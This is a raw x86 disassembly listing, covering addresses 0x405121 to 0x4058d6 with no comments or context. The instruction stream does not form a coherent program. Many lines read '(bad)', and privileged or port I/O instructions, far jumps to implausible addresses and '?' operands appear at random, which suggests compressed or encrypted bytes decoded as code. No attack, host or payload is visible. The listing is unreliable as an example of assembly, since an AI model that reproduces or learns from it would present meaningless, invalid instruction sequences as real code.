  405121:	jg     0x40515b
  405123:	mov    ch,0x70
  405125:	ret    
  405126:	nop
  405127:	jbe    0x40512e
  405129:	daa    
  40512a:	adc    esi,DWORD PTR [edi+0x4b14ad10]
  405130:	dec    ebp
  405131:	ins    BYTE PTR es:[edi],dx
  405132:	dec    DWORD PTR [ebp+0x4f4431c3]
  405138:	pusha  
  405139:	sbb    ebx,ecx
  40513b:	add    BYTE PTR [edi-0x5ef7a4ce],ah
  405141:	jo     0x4050d6
  405143:	cmc    
  405144:	mov    dl,BYTE PTR [edi-0x34e14b94]
  40514a:	sbb    BYTE PTR [edi+eax*4+0x33],0xb0
  40514f:	shl    DWORD PTR [ecx],1
  405151:	jnp    0x405106
  405153:	test   BYTE PTR cs:[edx+0x3f7082df],ah
  40515a:	lds    ecx,FWORD PTR [esi+0x64]
  40515d:	push   edx
  40515e:	pop    esp
  40515f:	outs   dx,DWORD PTR ds:[esi]
  405160:	add    esi,0x16
  405163:	out    0x27,eax
  405165:	sub    BYTE PTR [ebx+0x99ff6c0],dl
  40516b:	aad    0x47
  40516d:	nop
  40516e:	(bad)  
  405170:	ins    DWORD PTR es:[edi],dx
  405171:	enter  0x9780,0x8d
  405175:	outs   dx,BYTE PTR ds:[esi]
  405176:	iret   
  405177:	fcom   QWORD PTR [esi+0x5a]
  40517a:	mov    al,ds:0x311a8e73
  40517f:	mov    eax,0xf8c15559
  405184:	cmp    DWORD PTR [ecx+0x3b],esp
  405187:	inc    ecx
  405188:	jmp    0xa1f4e68c
  40518d:	(bad)  
  40518e:	xor    DWORD PTR [esi-0x4f],ebp
  405191:	mov    ds:0x7cac61a6,al
  405196:	iret   
  405197:	or     eax,0xefcd728f
  40519c:	dec    esp
  40519d:	rcl    BYTE PTR [ecx],cl
  40519f:	pop    eax
  4051a0:	popa   
  4051a1:	xchg   ebx,eax
  4051a2:	mov    ebp,DWORD PTR [edi+0x8d1ad21]
  4051a8:	xor    ch,BYTE PTR [edi]
  4051aa:	xchg   esp,eax
  4051ab:	cmp    BYTE PTR [edx-0x1786dd05],0x53
  4051b2:	jbe    0x405172
  4051b4:	loopne 0x40520f
  4051b6:	lahf   
  4051b7:	retf   
  4051b8:	mov    cl,0x3b
  4051ba:	ret    0x273b
  4051bd:	test   al,0xff
  4051bf:	icebp  
  4051c0:	aas    
  4051c1:	mov    ecx,DWORD PTR [eax-0x69d0abd8]
  4051c7:	jp     0x405202
  4051c9:	cmp    bl,BYTE PTR ds:0x597bf046
  4051cf:	out    dx,eax
  4051d0:	sbb    BYTE PTR [ecx],bh
  4051d2:	js     0x40524a
  4051d4:	shl    BYTE PTR [edi-0x4d],cl
  4051d7:	inc    esi
  4051d8:	fs loopne 0x40519c
  4051db:	sub    DWORD PTR [edi-0x2b],eax
  4051de:	cmp    eax,0xd476eb0e
  4051e3:	xchg   edx,eax
  4051e4:	push   esi
  4051e5:	fcmovnbe st,st(7)
  4051e7:	mov    ds:0x9b88ace9,al
  4051ec:	clc    
  4051ed:	cmc    
  4051ee:	loop   0x4051c7
  4051f0:	lahf   
  4051f1:	fucomip st,st(3)
  4051f3:	inc    edx
  4051f4:	and    al,0xbb
  4051f6:	xchg   esp,eax
  4051f7:	push   es
  4051f8:	push   esp
  4051f9:	jp     0x405213
  4051fb:	add    al,0x2f
  4051fd:	(bad)  
  4051fe:	fcomp  st(2)
  405200:	cmp    bh,cl
  405202:	or     ecx,ebp
  405204:	sub    DWORD PTR [esi-0x24],esp
  405207:	std    
  405208:	fmul   DWORD PTR [ebp-0x628fc173]
  40520e:	add    eax,0xe6bceec
  405213:	dec    esi
  405214:	mov    cs,WORD PTR [ecx]
  405216:	pusha  
  405217:	enterw 0xb56a,0x22
  40521c:	ss aad 0x66
  40521f:	lahf   
  405220:	js     0x4051fc
  405222:	xor    al,0xb4
  405224:	mov    esp,ebx
  405226:	imul   esp,DWORD PTR [ebx-0x28],0x4f
  40522a:	push   ds
  40522b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40522c:	aaa    
  40522d:	mov    edx,DWORD PTR [ebp+0x38]
  405230:	clc    
  405231:	stc    
  405232:	(bad)  
  405233:	adc    BYTE PTR [ecx+0x789ded8d],bh
  405239:	xchg   esi,eax
  40523a:	and    eax,0x8c550d97
  40523f:	mov    esp,0x3bd9bdf9
  405244:	inc    ebp
  405245:	sbb    DWORD PTR [eax+0x20878782],ecx
  40524b:	mov    dl,0x93
  40524d:	or     eax,0xeb2f287e
  405252:	int    0x70
  405254:	sti    
  405255:	pop    edi
  405256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405257:	jbe    0x4052cd
  405259:	je     0x4052ad
  40525b:	jmp    0x405252
  40525d:	jae    0x4052c3
  40525f:	cli    
  405260:	mov    ecx,0xfe485f32
  405265:	jo     0x405200
  405267:	mov    ah,0xf4
  405269:	xchg   DWORD PTR [edi+0xac1c7c5],ecx
  40526f:	(bad)  [ebx+0x8]
  405272:	sbb    eax,0xfb6769ea
  405277:	icebp  
  405278:	push   ebx
  405279:	sti    
  40527a:	scas   eax,DWORD PTR es:[edi]
  40527b:	xchg   dx,ax
  40527d:	int    0x68
  40527f:	imul   ecx,DWORD PTR [ebp-0x43],0x55
  405283:	fucom  st(0)
  405285:	mov    dl,0x5c
  405287:	(bad)  
  405288:	fld    QWORD PTR ds:0x17c7c42c
  40528e:	xchg   ebp,eax
  40528f:	out    dx,al
  405290:	pop    esp
  405291:	outs   dx,DWORD PTR ds:[esi]
  405292:	adc    al,0x4f
  405294:	(bad)  
  405295:	cli    
  405296:	and    dh,BYTE PTR [edx]
  405298:	xor    al,0xeb
  40529a:	adc    BYTE PTR [ecx],dl
  40529c:	ret    
  40529d:	push   edx
  40529e:	aaa    
  40529f:	jl     0x40526c
  4052a1:	mov    ebp,0xc9c33072
  4052a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052a7:	and    eax,0xffae0133
  4052ac:	test   ch,0x9f
  4052af:	sbb    DWORD PTR [ecx],edi
  4052b1:	pop    eax
  4052b2:	(bad)  
  4052b3:	hlt    
  4052b4:	lods   al,BYTE PTR ds:[esi]
  4052b5:	and    al,0x4d
  4052b7:	shl    DWORD PTR [ebx+0x35ac134b],0xf2
  4052be:	jae    0x4052ec
  4052c0:	dec    ebx
  4052c1:	and    al,0x9
  4052c3:	sar    bh,cl
  4052c5:	pushf  
  4052c6:	sbb    eax,0x2f0b24fc
  4052cb:	scas   eax,DWORD PTR es:[edi]
  4052cc:	xchg   ecx,eax
  4052cd:	aas    
  4052ce:	fcmovnu st,st(5)
  4052d0:	leave  
  4052d1:	push   ebp
  4052d2:	or     BYTE PTR ds:0x7f7e4bf,ch
  4052d8:	bound  esi,QWORD PTR [ebx]
  4052da:	jmp    0x40525f
  4052dc:	cmp    dh,BYTE PTR [eax]
  4052de:	fisub  WORD PTR [edi-0x24da07ac]
  4052e4:	pusha  
  4052e5:	addr16 lock xor al,0x56
  4052e9:	mov    dh,0xe1
  4052eb:	pop    edx
  4052ec:	jns    0x405274
  4052ee:	add    esi,eax
  4052f0:	out    0xe8,eax
  4052f2:	repz inc eax
  4052f4:	fist   DWORD PTR [ebp+0x4d]
  4052f7:	jge    0x4052f3
  4052f9:	hlt    
  4052fa:	sbb    DWORD PTR [ebp-0x78],edi
  4052fd:	sub    DWORD PTR [eax-0x9],0xffffffa2
  405301:	pop    es
  405302:	or     DWORD PTR [eax],ebp
  405304:	nop
  405305:	push   ecx
  405306:	ins    BYTE PTR es:[edi],dx
  405307:	mov    al,0x41
  405309:	mov    ch,0xee
  40530b:	jp     0x405389
  40530d:	sbb    BYTE PTR [ecx+0x3b],bh
  405310:	jge    0x4052f8
  405312:	jbe    0x405334
  405314:	sub    ebp,DWORD PTR [ebp-0x1]
  405317:	inc    edi
  405318:	std    
  405319:	cwde   
  40531a:	js     0x4052f3
  40531c:	popf   
  40531d:	jo     0x40531f
  40531f:	popa   
  405320:	mov    esi,0x806bb27f
  405325:	pop    esi
  405326:	sub    al,0x6d
  405328:	push   ebp
  405329:	push   ebx
  40532a:	(bad)  [edi+0x1683494]
  405330:	lds    eax,FWORD PTR [eax-0x6a98d299]
  405336:	data16 xor ch,BYTE PTR [ebp+0x5a]
  40533a:	xchg   edx,eax
  40533b:	int3   
  40533c:	xor    bl,BYTE PTR [eax+0xb]
  40533f:	xor    bh,BYTE PTR [ecx+0x56]
  405342:	fild   WORD PTR [ecx-0x74]
  405345:	inc    eax
  405346:	test   BYTE PTR [ecx+ebp*1],0x0
  40534a:	icebp  
  40534b:	xor    DWORD PTR [esi-0x13eb5358],0xe4af90b0
  405355:	out    dx,al
  405356:	mov    bl,0x8e
  405358:	jns    0x4053c4
  40535a:	pop    esi
  40535b:	gs jl  0x4053be
  40535e:	fbld   TBYTE PTR [eax-0x33]
  405361:	dec    eax
  405362:	loop   0x40531d
  405364:	fs dec ecx
  405366:	and    dh,dh
  405368:	mov    eax,0x63901bd4
  40536d:	icebp  
  40536e:	shr    ah,0x5b
  405371:	sub    al,cl
  405373:	bound  edi,QWORD PTR [ecx-0x70]
  405376:	bound  eax,QWORD PTR ds:0x25e388d1
  40537c:	arpl   WORD PTR [edx-0x640c385f],si
  405382:	cmp    bl,BYTE PTR [eax]
  405384:	sub    ch,BYTE PTR [ebp-0x36eac531]
  40538a:	arpl   WORD PTR [ebx+edi*4],bp
  40538d:	jg     0x405316
  40538f:	icebp  
  405390:	hlt    
  405391:	ins    BYTE PTR es:[edi],dx
  405392:	call   0xc0a33cce
  405397:	mov    edx,0x658ae04
  40539c:	xchg   DWORD PTR [ebx],eax
  40539e:	loop   0x4053d3
  4053a0:	scas   eax,DWORD PTR es:[edi]
  4053a1:	inc    edi
  4053a2:	bnd jl 0x40534d
  4053a5:	jg     0x4053bb
  4053a7:	mov    cl,0x9d
  4053a9:	cmp    al,0xba
  4053ab:	pop    ebx
  4053ac:	dec    esi
  4053ad:	pop    esi
  4053ae:	inc    ebx
  4053af:	out    0x56,al
  4053b1:	mov    ds:0xef79bec9,al
  4053b6:	ds mov ebp,0x3c325c2c
  4053bc:	fcomi  st,st(1)
  4053be:	mov    BYTE PTR [esp+esi*2],al
  4053c1:	add    eax,DWORD PTR [eax+0x77551a42]
  4053c7:	adc    al,0x41
  4053c9:	mov    bl,0x24
  4053cb:	ror    DWORD PTR [ebx-0x7b],1
  4053ce:	cmc    
  4053cf:	pop    es
  4053d0:	mov    edi,ebx
  4053d2:	jbe    0x4053cf
  4053d4:	es fs fwait
  4053d7:	cld    
  4053d8:	(bad)  
  4053da:	aaa    
  4053db:	add    eax,ecx
  4053dd:	ins    DWORD PTR es:[edi],dx
  4053de:	jmp    0x4f2859e2
  4053e3:	cwde   
  4053e4:	cld    
  4053e5:	int3   
  4053e6:	mov    cl,0x29
  4053e8:	jp     0x405430
  4053ea:	cmp    eax,0x141625e5
  4053ef:	pop    edi
  4053f0:	enter  0x9d2d,0x6c
  4053f4:	in     eax,dx
  4053f5:	jle    0x405382
  4053f7:	mov    BYTE PTR [eax*4+0x41c85eec],dl
  4053fe:	stos   BYTE PTR es:[edi],al
  4053ff:	test   cl,bl
  405401:	imul   esp,DWORD PTR [ebx+edi*4+0x73],0xffffffe0
  405406:	pop    ecx
  405407:	aaa    
  405408:	xlat   BYTE PTR ds:[ebx]
  405409:	stos   BYTE PTR es:[edi],al
  40540a:	push   edx
  40540b:	fcmovb st,st(3)
  40540d:	or     DWORD PTR [ebx+0x62],eax
  405410:	mov    al,ds:0x8dac506d
  405415:	(bad)  
  405416:	ds xor eax,0xc3edad1c
  40541c:	pop    eax
  40541d:	(bad)  
  40541e:	iret   
  40541f:	es jmp 0x4053e3
  405422:	xchg   edx,eax
  405423:	dec    ebx
  405424:	and    DWORD PTR [ebp+0x6d723143],esi
  40542a:	inc    esp
  40542b:	sub    cl,ah
  40542d:	cmp    DWORD PTR [esi+0x4100e40a],ebp
  405433:	(bad)  
  405435:	mov    edi,0x4e2f89f9
  40543a:	adc    bh,al
  40543c:	popf   
  40543d:	test   al,0x1f
  40543f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405440:	xchg   ecx,eax
  405441:	xor    ah,BYTE PTR [edx+eax*2+0x21]
  405445:	mov    ah,0x84
  405447:	fsubr  st(1),st
  405449:	sbb    ebp,DWORD PTR [esi]
  40544b:	sub    eax,0xe4cd7e90
  405450:	repz int3 
  405452:	pusha  
  405453:	sbb    BYTE PTR [esi],bl
  405455:	fist   DWORD PTR [eax]
  405457:	mov    esp,0xe7f3dd99
  40545c:	gs hlt 
  40545e:	mov    WORD PTR [esi+esi*2-0x2e],?
  405462:	push   ebp
  405463:	cmpxchg DWORD PTR [edx],esp
  405466:	cdq    
  405467:	(bad)  
  405468:	test   al,0x5f
  40546a:	sub    al,BYTE PTR [esi-0x52015943]
  405470:	dec    esp
  405471:	(bad)  
  405472:	call   0xe684:0x3fc36f50
  405479:	push   ebx
  40547a:	xchg   esi,eax
  40547b:	test   eax,0x3fc359b9
  405480:	lock mov esi,0xf3b6e9d
  405486:	sub    al,0x35
  405488:	in     al,0x91
  40548a:	xor    edx,esp
  40548c:	dec    edi
  40548d:	xor    DWORD PTR [ebx+0x70],edi
  405490:	test   BYTE PTR [ebx-0x18],0xcf
  405494:	xchg   esi,eax
  405495:	fsub   QWORD PTR ds:0x877f1171
  40549b:	pop    ss
  40549c:	js     0x4054b0
  40549e:	xchg   ebx,eax
  40549f:	js     0x4054c6
  4054a1:	sbb    BYTE PTR [ebp+0x52e7545c],dh
  4054a7:	mov    bl,0x4f
  4054a9:	sub    BYTE PTR [edx+0x2ac24061],dl
  4054af:	jmp    0x650eb548
  4054b4:	loope  0x40548f
  4054b6:	mov    ebp,0x31dd0b41
  4054bb:	mov    eax,ds:0x9b093ff9
  4054c0:	es xchg ebp,eax
  4054c2:	ja     0x4054b6
  4054c4:	jns    0x40547b
  4054c6:	or     esp,esi
  4054c8:	pop    ebp
  4054c9:	jp     0x40547d
  4054cb:	dec    edx
  4054cc:	out    dx,eax
  4054cd:	mov    bh,0xce
  4054cf:	jae    0x40549c
  4054d1:	cmp    BYTE PTR [ecx+0x4e],dh
  4054d4:	xchg   ebx,eax
  4054d5:	neg    BYTE PTR [ebp+0x23b025b1]
  4054db:	movups xmm5,XMMWORD PTR [esi]
  4054de:	push   ebx
  4054df:	mov    ch,BYTE PTR [esi]
  4054e1:	xchg   edi,eax
  4054e2:	mov    ch,0xea
  4054e4:	push   ebp
  4054e5:	loopne 0x40550e
  4054e7:	xchg   ecx,eax
  4054e8:	pop    ecx
  4054e9:	(bad)  
  4054ea:	cmc    
  4054eb:	shl    BYTE PTR [ecx],1
  4054ed:	add    bh,al
  4054ef:	dec    ebp
  4054f0:	xchg   ecx,eax
  4054f1:	ror    DWORD PTR [edi+ebx*4+0x31],1
  4054f5:	(bad)  
  4054f7:	pop    es
  4054f8:	or     eax,0x29572f9f
  4054fd:	lods   eax,DWORD PTR ds:[esi]
  4054fe:	pop    ebp
  4054ff:	cmp    al,0xa5
  405501:	ud1    bp,WORD PTR [edx]
  405505:	cmp    BYTE PTR ds:0xfc6bbccd,bl
  40550b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40550c:	sbb    dl,BYTE PTR [ebx-0x557af7f0]
  405512:	cwde   
  405513:	js     0x40550a
  405515:	mov    esp,0x6391952c
  40551a:	cmp    eax,0x572dc4be
  40551f:	leave  
  405520:	fiadd  WORD PTR [esi]
  405522:	and    BYTE PTR [ecx],bh
  405524:	jb     0x4054ae
  405526:	adc    edi,DWORD PTR [edi-0x479013c7]
  40552c:	push   es
  40552d:	add    eax,0xda54265
  405532:	stos   DWORD PTR es:[edi],eax
  405533:	call   0x68db026b
  405538:	cmp    bl,bl
  40553a:	dec    ecx
  40553b:	xor    bh,BYTE PTR [edi]
  40553d:	pop    esp
  40553e:	dec    edi
  40553f:	inc    esp
  405540:	mov    cl,0xa1
  405542:	inc    edx
  405543:	cmp    al,0x32
  405545:	clc    
  405546:	popa   
  405547:	sub    eax,0xfb387c16
  40554c:	call   0xa729baed
  405551:	mov    al,0xdb
  405553:	xchg   BYTE PTR [ecx],ch
  405555:	xchg   BYTE PTR [ecx],ah
  405557:	stc    
  405558:	(bad)  
  405559:	das    
  40555a:	scas   al,BYTE PTR es:[edi]
  40555b:	or     esi,DWORD PTR [ebx+0x2b3dc7da]
  405561:	mov    ebp,0xc8a04e93
  405566:	into   
  405567:	mov    edi,0xce14aa54
  40556c:	dec    esi
  40556d:	lods   eax,DWORD PTR ds:[esi]
  40556e:	dec    esi
  40556f:	std    
  405570:	sar    DWORD PTR [esi],cl
  405572:	(bad)  
  405573:	dec    eax
  405574:	inc    eax
  405575:	cwde   
  405576:	pop    ebp
  405577:	and    ah,0xfb
  40557a:	push   0xffffff9e
  40557c:	add    edi,esp
  40557e:	add    DWORD PTR [ecx-0x2e],ebx
  405581:	gs or  eax,0x83876b18
  405587:	dec    esp
  405588:	int3   
  405589:	push   ds
  40558a:	outs   dx,BYTE PTR ds:[esi]
  40558b:	xchg   edi,eax
  40558c:	cmp    ch,al
  40558e:	pop    esi
  40558f:	inc    ebx
  405590:	cld    
  405591:	(bad)  
  405592:	sti    
  405593:	or     al,0xac
  405595:	icebp  
  405596:	xor    cl,cl
  405598:	jmp    0xa1cf9a74
  40559d:	loopne 0x40555d
  40559f:	sub    dh,BYTE PTR [edi+0x13]
  4055a2:	sbb    BYTE PTR [edi-0x23144f6c],bh
  4055a8:	dec    esp
  4055a9:	lods   eax,DWORD PTR ds:[esi]
  4055aa:	nop
  4055ab:	mov    eax,ds:0x332812a
  4055b0:	jne    0x40561f
  4055b2:	test   ecx,edi
  4055b4:	dec    esi
  4055b5:	cmp    al,0xee
  4055b7:	mov    al,ds:0x35ed89a1
  4055bc:	retf   0x4e03
  4055bf:	sub    BYTE PTR [eax+esi*4+0x1],ah
  4055c3:	repz fnstenv [edx]
  4055c6:	(bad)  
  4055c7:	in     al,0xa6
  4055c9:	aam    0xf5
  4055cb:	test   al,0x8
  4055cd:	loop   0x40559e
  4055cf:	xchg   ecx,eax
  4055d0:	xchg   esi,eax
  4055d1:	xchg   ah,al
  4055d3:	test   eax,0x1208adb2
  4055d8:	loope  0x405576
  4055da:	ins    BYTE PTR es:[edi],dx
  4055db:	enter  0x1960,0x43
  4055df:	ja     0x40563d
  4055e1:	dec    ebx
  4055e2:	bound  ecx,QWORD PTR ds:0x2f350702
  4055e8:	mov    bh,0x5d
  4055ea:	inc    esi
  4055eb:	dec    edx
  4055ec:	mov    eax,ds:0xf8f4225e
  4055f1:	aad    0x52
  4055f3:	sub    eax,0xb6800def
  4055f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055f9:	and    eax,0x1a4e1915
  4055fe:	xor    al,BYTE PTR [esi-0x72]
  405601:	cld    
  405602:	in     al,0xa8
  405604:	hlt    
  405605:	loope  0x4055db
  405607:	in     eax,0x59
  405609:	clc    
  40560a:	ror    DWORD PTR [eax+edx*1-0x79],cl
  40560e:	inc    esp
  40560f:	imul   esp,DWORD PTR [edi],0xb
  405612:	fmul   DWORD PTR [eax+0x28]
  405615:	stos   BYTE PTR es:[edi],al
  405616:	mov    DWORD PTR [edi],ebp
  405618:	or     eax,0x82b3a120
  40561d:	int    0xef
  40561f:	inc    eax
  405620:	lods   eax,DWORD PTR ds:[esi]
  405621:	or     eax,0xf67a9e24
  405626:	jnp    0x4055cc
  405628:	xchg   edi,eax
  405629:	sub    eax,0xb0bf9218
  40562e:	jnp    0x405636
  405630:	sub    cl,BYTE PTR [ebx]
  405632:	daa    
  405633:	in     al,0xf8
  405635:	shl    DWORD PTR [edi],0xdc
  405638:	add    ah,BYTE PTR [ecx-0xfd7fdf2]
  40563e:	ja     0x405697
  405640:	jl     0x4055c4
  405642:	enter  0xa3b6,0x9e
  405646:	(bad)  
  405648:	ja     0x4055f9
  40564a:	or     esi,DWORD PTR [eax-0x5409e094]
  405650:	mov    eax,ds:0xdd870b0a
  405655:	sub    BYTE PTR [ebp-0x23],ch
  405658:	push   0xab9e1f76
  40565d:	push   0x61
  40565f:	sub    ah,al
  405661:	or     ch,ah
  405663:	std    
  405664:	push   es
  405665:	fidivr DWORD PTR gs:[edx]
  405668:	add    al,0x55
  40566a:	mov    esp,0xf5bcd43e
  40566f:	push   ecx
  405670:	adc    al,0x41
  405672:	jbe    0x40562f
  405674:	cs jmp 0xff:0x1dd538a4
  40567c:	ds jp  0x405694
  40567f:	sbb    dh,BYTE PTR [eax-0x55a8479a]
  405685:	out    0x7c,eax
  405687:	fs cmp eax,eax
  40568a:	inc    ebp
  40568b:	in     ax,0xdd
  40568e:	jmp    0x40565b
  405690:	in     al,dx
  405691:	bound  ecx,QWORD PTR [esi-0x18]
  405694:	jns    0x405630
  405696:	repz add BYTE PTR [ebp+0x2b24e1ac],dh
  40569d:	pop    eax
  40569e:	repz mov cs,ebp
  4056a1:	dec    ebx
  4056a2:	stos   DWORD PTR es:[edi],eax
  4056a3:	inc    ebx
  4056a4:	or     eax,0xe091f832
  4056a9:	popf   
  4056aa:	cmp    eax,esp
  4056ac:	mov    edi,0xfb5ed252
  4056b1:	jl     0x40569d
  4056b3:	jle    0x4056db
  4056b5:	mov    ebp,0x9aa8130d
  4056ba:	into   
  4056bb:	ficomp WORD PTR [eax]
  4056bd:	adc    al,0x16
  4056bf:	je     0x4056da
  4056c1:	fs push esp
  4056c3:	das    
  4056c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056c5:	pop    ebp
  4056c6:	es pop ebx
  4056c8:	dec    edi
  4056c9:	ror    ebp,0xe5
  4056cc:	mov    ch,0x84
  4056ce:	sbb    al,0xae
  4056d0:	xchg   ebp,eax
  4056d1:	test   dl,al
  4056d3:	cmc    
  4056d4:	jno    0x40572a
  4056d6:	mov    bh,0x57
  4056d8:	cmp    DWORD PTR [ebx+0x2],edx
  4056db:	ficom  DWORD PTR [esi-0x7e910781]
  4056e1:	sub    eax,0xab65cb3f
  4056e6:	(bad)  
  4056e7:	push   ds
  4056e8:	into   
  4056e9:	cwde   
  4056ea:	in     eax,dx
  4056eb:	jae    0x405699
  4056ed:	arpl   WORD PTR [ecx],sp
  4056ef:	sub    al,0x30
  4056f1:	(bad)  
  4056f2:	aam    0x77
  4056f4:	lds    ebp,FWORD PTR [edi-0x6876bb5f]
  4056fa:	inc    ecx
  4056fb:	in     eax,0x83
  4056fd:	idiv   DWORD PTR [eax]
  4056ff:	pop    ebx
  405700:	jecxz  0x405721
  405702:	push   ecx
  405703:	ret    0x2770
  405706:	push   0xffffffd9
  405708:	inc    ecx
  405709:	inc    cl
  40570b:	mov    DWORD PTR ss:[esi],edx
  40570e:	adc    dl,dh
  405710:	cli    
  405711:	ror    DWORD PTR [bx+di],0xd3
  405715:	inc    edi
  405716:	push   0x20e3ddc3
  40571b:	stc    
  40571c:	cmp    eax,0x5f238eb9
  405721:	in     eax,dx
  405722:	push   ecx
  405723:	popa   
  405724:	mov    ch,0x27
  405726:	repnz mov BYTE PTR [ecx-0x34c4103a],ah
  40572d:	sub    al,0xf5
  405730:	retf   0xd597
  405733:	jp     0x4056c9
  405735:	adc    DWORD PTR [edi],esp
  405737:	lock push ds
  405739:	popa   
  40573a:	(bad)  
  40573b:	shr    BYTE PTR [eax-0x19],1
  40573e:	mov    eax,ds:0xcc775ff0
  405743:	mov    al,0x56
  405745:	push   esp
  405746:	fxch   st(2)
  405748:	cmp    DWORD PTR [edi-0xf],ebx
  40574b:	adc    eax,0xe112ac02
  405750:	inc    esp
  405751:	test   ecx,esi
  405753:	js     0x4056e1
  405755:	scas   eax,DWORD PTR es:[edi]
  405756:	fs or  eax,0x7be66da
  40575c:	mov    bl,0x5c
  40575e:	repz shl DWORD PTR [esi+0x2d],cl
  405762:	shr    cl,1
  405764:	inc    edi
  405765:	inc    ecx
  405766:	stc    
  405767:	pop    ds
  405768:	mov    ds:0x9d0d538c,eax
  40576d:	or     BYTE PTR [edx+0x3c],ah
  405770:	xchg   ch,bl
  405772:	stos   BYTE PTR es:[edi],al
  405773:	int3   
  405774:	mov    al,ds:0xc2701a13
  405779:	jns    0x4057c1
  40577b:	fs out 0xdd,eax
  40577e:	mov    dl,0xee
  405780:	mov    ch,0x6c
  405782:	mov    dh,0x3f
  405784:	mov    ?,WORD PTR [edi+edx*4]
  405787:	in     al,dx
  405788:	xchg   ebp,eax
  405789:	inc    ecx
  40578a:	in     al,0xcb
  40578c:	(bad)
  405790:	jp     0x405764
  405792:	retf   
  405793:	in     al,dx
  405794:	(bad)  
  405795:	adc    eax,0xa4623122
  40579a:	stc    
  40579b:	jb     0x405773
  40579d:	xor    eax,0xabccac45
  4057a2:	push   0x1242bf12
  4057a7:	dec    esp
  4057a8:	push   ds
  4057a9:	mov    BYTE PTR gs:[esi-0x2d2965b9],al
  4057b0:	mov    ds:0x90ba584f,eax
  4057b5:	mov    DWORD PTR [ecx],ecx
  4057b7:	adc    dl,bh
  4057b9:	clc    
  4057ba:	pop    ecx
  4057bb:	sbb    BYTE PTR [eax-0x11],0xe6
  4057bf:	sub    ebx,esi
  4057c1:	ins    BYTE PTR es:[edi],dx
  4057c2:	sub    DWORD PTR [edx+0xf288d80],edx
  4057c8:	mov    edi,0xb378f9ad
  4057cd:	xchg   ebp,eax
  4057ce:	or     edi,ecx
  4057d0:	mov    dl,0x3a
  4057d2:	or     ebp,DWORD PTR [ecx+0x5b]
  4057d5:	ret    0xc4b5
  4057d8:	sar    DWORD PTR [ecx-0x5b],0x90
  4057dc:	cdq    
  4057dd:	mov    dl,0x17
  4057df:	push   esp
  4057e0:	cmc    
  4057e1:	imul   ebp,ebx,0x18
  4057e4:	xchg   edi,eax
  4057e5:	xchg   ebx,eax
  4057e6:	and    edi,ecx
  4057e8:	(bad)  
  4057ea:	xor    BYTE PTR [eax-0x71],dl
  4057ed:	mov    cl,0x29
  4057ef:	push   esi
  4057f0:	push   esp
  4057f1:	lea    ebx,[ebp-0x186391a2]
  4057f7:	or     al,0x6
  4057f9:	int3   
  4057fa:	es jb  0x40586e
  4057fd:	shrd   DWORD PTR [ecx-0x5356a0f2],ecx,cl
  405804:	jbe    0x405873
  405806:	jne    0x40582c
  405808:	push   0xffffffb2
  40580a:	cmp    bh,ah
  40580c:	lock out dx,eax
  40580e:	adc    ah,dl
  405810:	fdiv   QWORD PTR [ebx]
  405812:	pop    ebp
  405813:	sub    al,0x3e
  405815:	jge    0x405877
  405817:	mov    eax,ds:0x2faa8bef
  40581c:	push   0xffffffb1
  40581e:	push   esp
  40581f:	(bad)  
  405821:	mov    esi,0xde040990
  405826:	xchg   edx,eax
  405827:	stos   DWORD PTR es:[edi],eax
  405828:	cmp    eax,0x20931cbc
  40582d:	(bad)  
  40582e:	loopne 0x4057c2
  405830:	or     DWORD PTR [esi],eax
  405832:	cli    
  405833:	pop    eax
  405834:	aam    0xe1
  405836:	pop    esp
  405837:	or     BYTE PTR [edi+0x68],ch
  40583a:	out    0xb,eax
  40583c:	outs   dx,BYTE PTR ds:[esi]
  40583d:	aad    0xfb
  40583f:	out    0x38,al
  405841:	popa   
  405842:	jp     0x4058b9
  405844:	ds sahf 
  405846:	mov    dl,0x59
  405848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405849:	fbld   TBYTE PTR [eax-0x53]
  40584c:	and    al,0xf3
  40584e:	call   0xc67d:0xbf8a4aa
  405855:	loopne 0x405842
  405857:	mov    edx,0x681bf31b
  40585c:	pop    es
  40585d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40585e:	push   ds
  40585f:	xor    DWORD PTR [eax+0x2ccb8fcf],esp
  405865:	cs sbb al,0xe8
  405868:	repz rol esi,1
  40586b:	mov    al,0x82
  40586d:	push   cs
  40586e:	mov    bh,bh
  405870:	sbb    al,0xc6
  405872:	xchg   edi,eax
  405873:	in     eax,dx
  405874:	mov    es,esp
  405876:	jbe    0x4058f6
  405878:	sub    DWORD PTR [edi+0x3c],esi
  40587b:	(bad)  
  40587c:	out    0x4,al
  40587e:	test   BYTE PTR [eax],dl
  405880:	enter  0xf3f8,0xe1
  405884:	loope  0x405893
  405886:	sar    bh,1
  405888:	xchg   ebx,eax
  405889:	push   ds
  40588a:	push   ecx
  40588b:	pop    eax
  40588c:	js     0x40581b
  40588e:	retf   0x133a
  405891:	mov    bl,0x1e
  405893:	xchg   ebx,eax
  405894:	jno    0x405868
  405896:	xchg   edi,eax
  405897:	shl    dh,cl
  405899:	retf   
  40589a:	rcr    BYTE PTR [esi+0x67],cl
  40589d:	pop    ebp
  40589e:	shl    DWORD PTR [ebp-0x654341fc],1
  4058a4:	stos   DWORD PTR es:[edi],eax
  4058a5:	cmp    DWORD PTR [ecx+0x33],ebp
  4058a8:	cdq    
  4058a9:	push   ss
  4058aa:	or     DWORD PTR [edx+0x64],eax
  4058ad:	mov    ?,WORD PTR [edi-0x1c]
  4058b0:	(bad)  
  4058b1:	pushf  
  4058b2:	cwde   
  4058b3:	(bad)  
  4058b5:	popf   
  4058b6:	test   esi,edi
  4058b8:	cmp    DWORD PTR [ebx+0x14],ebp
  4058bb:	test   BYTE PTR [ebp+0x59],bh
  4058be:	mov    dh,0x2
  4058c0:	dec    edi
  4058c1:	mov    bl,0x49
  4058c3:	xor    BYTE PTR [edi+0x7c],0x60
  4058c7:	repz xchg esp,eax
  4058c9:	or     al,BYTE PTR [ecx-0x73]
  4058cc:	xchg   ebx,eax
  4058cd:	fdiv   st,st(1)
  4058cf:	mov    dl,0xbb
  4058d1:	cli    
  4058d2:	daa    
  4058d3:	xchg   ebx,eax
  4058d4:	mov    dh,al
  4058d6:	loopne 0x405885
